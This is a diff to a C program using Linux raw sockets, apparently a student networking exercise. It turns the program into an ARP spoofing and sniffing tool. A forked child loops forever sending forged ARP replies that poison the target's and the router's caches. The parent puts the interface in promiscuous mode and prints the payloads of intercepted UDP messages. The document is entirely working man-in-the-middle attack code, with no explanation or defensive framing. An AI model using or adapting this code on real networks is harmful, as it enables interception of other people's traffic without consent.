@@ -17,6 +17,7 @@
 #include <unistd.h>
 #include <net/if.h>
 #include <netinet/ether.h>
+#include <sys/types.h>
 #include "raw.h"
 
 #define TARGET_MAC0	0xFF
@@ -70,6 +71,7 @@ int recv_raw_udp(int socket, uint8_t *src_ip, uint16_t src_port, uint8_t *dst_ip
 int main(int argc, char *argv[])
 {
 	int sockfd;
+	struct ifreq ifopts;
 	struct ifreq if_idx;
 	struct ifreq if_mac;
 	int tx_len = 0;
@@ -84,114 +86,176 @@ int main(int argc, char *argv[])
 	
 	char ifName[IFNAMSIZ];
 	
-	/* Get interface name */
-	if (argc > 1)
-		strcpy(ifName, argv[1]);
-	else
-		strcpy(ifName, DEFAULT_IF);
+	pid_t pid;
+	pid = fork();
+	printf("%d\n",pid);
+	if(pid == 0)
+	{	
+		/* Get interface name */
+		if (argc > 1)
+			strcpy(ifName, argv[1]);
+		else
+			strcpy(ifName, DEFAULT_IF);
 
-	/* Open RAW socket to send on */
-	if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETHER_TYPE))) == -1) {
-	    perror("socket");
-	}
+		/* Open RAW socket to send on */
+		if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETHER_TYPE))) == -1) {
+			perror("socket");
+		}
 
-	/* Get the index of the interface to send on */
-	memset(&if_idx, 0, sizeof(struct ifreq));
-	strncpy(if_idx.ifr_name, ifName, IFNAMSIZ-1);
-	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0)
-	    perror("SIOCGIFINDEX");
-	/* Get the MAC address of the interface to send on */
-	memset(&if_mac, 0, sizeof(struct ifreq));
-	strncpy(if_mac.ifr_name, ifName, IFNAMSIZ-1);
-	if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0)
-	    perror("SIOCGIFHWADDR");
+		/* Get the index of the interface to send on */
+		memset(&if_idx, 0, sizeof(struct ifreq));
+		strncpy(if_idx.ifr_name, ifName, IFNAMSIZ-1);
+		if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0)
+			perror("SIOCGIFINDEX");
+		/* Get the MAC address of the interface to send on */
+		memset(&if_mac, 0, sizeof(struct ifreq));
+		strncpy(if_mac.ifr_name, ifName, IFNAMSIZ-1);
+		if (ioctl(sockfd, SIOCGIFHWADDR, &if_mac) < 0)
+			perror("SIOCGIFHWADDR");
 
-	/* Construct the Ethernet header */
-	memset(sendbuf, 0, BUF_SIZ);
-	/* Ethernet header */
-	eh->ether_shost[0] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[0];
-	eh->ether_shost[1] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[1];
-	eh->ether_shost[2] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[2];
-	eh->ether_shost[3] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
-	eh->ether_shost[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
-	eh->ether_shost[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];
-	eh->ether_dhost[0] = TARGET_MAC0;
-	eh->ether_dhost[1] = TARGET_MAC1;
-	eh->ether_dhost[2] = TARGET_MAC2;
-	eh->ether_dhost[3] = TARGET_MAC3;
-	eh->ether_dhost[4] = TARGET_MAC4;
-	eh->ether_dhost[5] = TARGET_MAC5;
-	/* Ethertype field */
-	eh->ether_type = htons(ETHER_TYPE);
-	memcpy(sendbuf, eh, sizeof(struct ether_header));
-	tx_len += sizeof(struct ether_header);
+		/* Construct the Ethernet header */
+		memset(sendbuf, 0, BUF_SIZ);
+		/* Ethernet header */
+		eh->ether_shost[0] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[0];
+		eh->ether_shost[1] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[1];
+		eh->ether_shost[2] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[2];
+		eh->ether_shost[3] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[3];
+		eh->ether_shost[4] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[4];
+		eh->ether_shost[5] = ((uint8_t *)&if_mac.ifr_hwaddr.sa_data)[5];
+		eh->ether_dhost[0] = TARGET_MAC0;
+		eh->ether_dhost[1] = TARGET_MAC1;
+		eh->ether_dhost[2] = TARGET_MAC2;
+		eh->ether_dhost[3] = TARGET_MAC3;
+		eh->ether_dhost[4] = TARGET_MAC4;
+		eh->ether_dhost[5] = TARGET_MAC5;
+		/* Ethertype field */
+		eh->ether_type = htons(ETHER_TYPE);
+		memcpy(sendbuf, eh, sizeof(struct ether_header));
+		tx_len += sizeof(struct ether_header);
 
-	/* ARP HEADER*/
-	//sendbuf[tx_len++] = 0xde;
-	//sendbuf[tx_len++] = 0xad;
-	//sendbuf[tx_len++] = 0xbe;
-	//sendbuf[tx_len++] = 0xef;
-	memcpy(sendbuf + tx_len, ARP_header, sizeof(ARP_header));
-	tx_len += sizeof(ARP_header);
+		/* ARP HEADER*/
+		//sendbuf[tx_len++] = 0xde;
+		//sendbuf[tx_len++] = 0xad;
+		//sendbuf[tx_len++] = 0xbe;
+		//sendbuf[tx_len++] = 0xef;
+		memcpy(sendbuf + tx_len, ARP_header, sizeof(ARP_header));
+		tx_len += sizeof(ARP_header);
+		
+		memcpy(sendbuf +tx_len, eh->ether_shost,6); //source MAC
+		tx_len += 6;
+		
 	
-	memcpy(sendbuf +tx_len, eh->ether_shost,6); //source MAC
-	tx_len += 6;	
-	while(1)
-	{
-		/*send to target */
-		
-		memcpy(sendbuf + tx_len, router_ip, 4); //source IP
-		tx_len += 4;
-		memset(sendbuf + tx_len, 0, 6); //dest MAC
-		tx_len += 6;
-		memcpy(sendbuf + tx_len, target_ip, 4); //dest IP
-		tx_len += 4;
-		/////////////////////////	
-		/* Index of the network device */
-		socket_address.sll_ifindex = if_idx.ifr_ifindex;
-		/* Address length*/
-		socket_address.sll_halen = ETH_ALEN;
-		/* Destination MAC */
-		socket_address.sll_addr[0] = TARGET_MAC0;
-		socket_address.sll_addr[1] = TARGET_MAC1;
-		socket_address.sll_addr[2] = TARGET_MAC2;
-		socket_address.sll_addr[3] = TARGET_MAC3;
-		socket_address.sll_addr[4] = TARGET_MAC4;
-		socket_address.sll_addr[5] = TARGET_MAC5;
+	
+		while(1)
+		{
+			/*send to target */
+			
+			memcpy(sendbuf + tx_len, router_ip, 4); //source IP
+			tx_len += 4;
+			memset(sendbuf + tx_len, 0, 6); //dest MAC
+			tx_len += 6;
+			memcpy(sendbuf + tx_len, target_ip, 4); //dest IP
+			tx_len += 4;
+			/////////////////////////	
+			/* Index of the network device */
+			socket_address.sll_ifindex = if_idx.ifr_ifindex;
+			/* Address length*/
+			socket_address.sll_halen = ETH_ALEN;
+			/* Destination MAC */
+			socket_address.sll_addr[0] = TARGET_MAC0;
+			socket_address.sll_addr[1] = TARGET_MAC1;
+			socket_address.sll_addr[2] = TARGET_MAC2;
+			socket_address.sll_addr[3] = TARGET_MAC3;
+			socket_address.sll_addr[4] = TARGET_MAC4;
+			socket_address.sll_addr[5] = TARGET_MAC5;
 
-		/* Send packet */
-		if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
-			printf("Send failed\n");
+			/* Send packet */
+			if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
+				printf("Send failed\n");
 
 
-		tx_len -= 14;
-		/*send to router */
-		memcpy(sendbuf + tx_len, target_ip, 4); //source IP
-		tx_len += 4;
-		memset(sendbuf + tx_len, 0, 6); //dest MAC
-		tx_len += 6;
-		memcpy(sendbuf + tx_len, router_ip, 4); //dest IP
-		tx_len += 4;
-		
-		/* Index of the network device */
-		socket_address.sll_ifindex = if_idx.ifr_ifindex;
-		/* Address length*/
-		socket_address.sll_halen = ETH_ALEN;
-		/* Destination MAC */
-		socket_address.sll_addr[0] = TARGET_MAC0;
-		socket_address.sll_addr[1] = TARGET_MAC1;
-		socket_address.sll_addr[2] = TARGET_MAC2;
-		socket_address.sll_addr[3] = TARGET_MAC3;
-		socket_address.sll_addr[4] = TARGET_MAC4;
-		socket_address.sll_addr[5] = TARGET_MAC5;
-		
-		
-		if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
-			printf("Send failed\n");
-		/////////////////////////
-		tx_len -= 14;
-		
-		sleep(2);
+			tx_len -= 14;
+			/*send to router */
+			memcpy(sendbuf + tx_len, target_ip, 4); //source IP
+			tx_len += 4;
+			memset(sendbuf + tx_len, 0, 6); //dest MAC
+			tx_len += 6;
+			memcpy(sendbuf + tx_len, router_ip, 4); //dest IP
+			tx_len += 4;
+			
+			/* Index of the network device */
+			socket_address.sll_ifindex = if_idx.ifr_ifindex;
+			/* Address length*/
+			socket_address.sll_halen = ETH_ALEN;
+			/* Destination MAC */
+			socket_address.sll_addr[0] = TARGET_MAC0;
+			socket_address.sll_addr[1] = TARGET_MAC1;
+			socket_address.sll_addr[2] = TARGET_MAC2;
+			socket_address.sll_addr[3] = TARGET_MAC3;
+			socket_address.sll_addr[4] = TARGET_MAC4;
+			socket_address.sll_addr[5] = TARGET_MAC5;
+			
+			
+			if (sendto(sockfd, sendbuf, tx_len, 0, (struct sockaddr*)&socket_address, sizeof(struct sockaddr_ll)) < 0)
+				printf("Send failed\n");
+			/////////////////////////
+			tx_len -= 14;
+			
+			sleep(1);
+		}
 	}
+	else
+	{
+		
+		
+		
+		
+		if (argc > 1)
+			strcpy(ifName, argv[1]);
+		else
+			strcpy(ifName, DEFAULT_IF);
+
+		/* Open RAW socket */
+		if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1)
+			perror("socket");
+		
+		/* Set interface to promiscuous mode */
+		strncpy(ifopts.ifr_name, ifName, IFNAMSIZ-1);
+		ioctl(sockfd, SIOCGIFFLAGS, &ifopts);
+		ifopts.ifr_flags |= IFF_PROMISC;
+		ioctl(sockfd, SIOCSIFFLAGS, &ifopts);
+		
+		
+		uint8_t * src_ip;
+		uint16_t src_port;
+		uint8_t * dst_ip;
+		uint16_t dst_port;
+		uint8_t *payload;
+		uint16_t size;
+		uint8_t raw_buffer[ETH_LEN];
+		struct eth_frame_s *raw = (struct eth_frame_s *)&raw_buffer;
+		while(1)
+		{	
+			int numbytes = recvfrom(sockfd, raw_buffer, ETH_LEN, 0, NULL, NULL);
+			if (raw->ethernet.eth_type == ntohs(ETH_P_IP))
+			{
+				if(raw->ip.proto == PROTO_UDP)
+				{
+					src_ip = raw->ip.src;
+					dst_ip = raw->ip.dst;
+					dst_port = ntohs(raw->udp.dst_port);
+					src_port = ntohs(raw->udp.src_port);
+					payload = (char *)&raw->udp + sizeof(struct udp_hdr_s);
+					printf("received UDP message\n");
+					printf("Source port: %d ##### Destination port: %d", src_port, dst_port);
+					printf("Source : %d.%d.%d.%d\n",raw->ip.src[0],raw->ip.src[1],raw->ip.src[2],raw->ip.src[3]);
+					printf("Destination : %d.%d.%d.%d\n",raw->ip.dst[0],raw->ip.dst[1],raw->ip.dst[2],raw->ip.dst[3]);
+					printf("message: %s\n", payload);
+						
+				}
+			}
+					continue;
+		}
+	}	
 	return 0;
 }
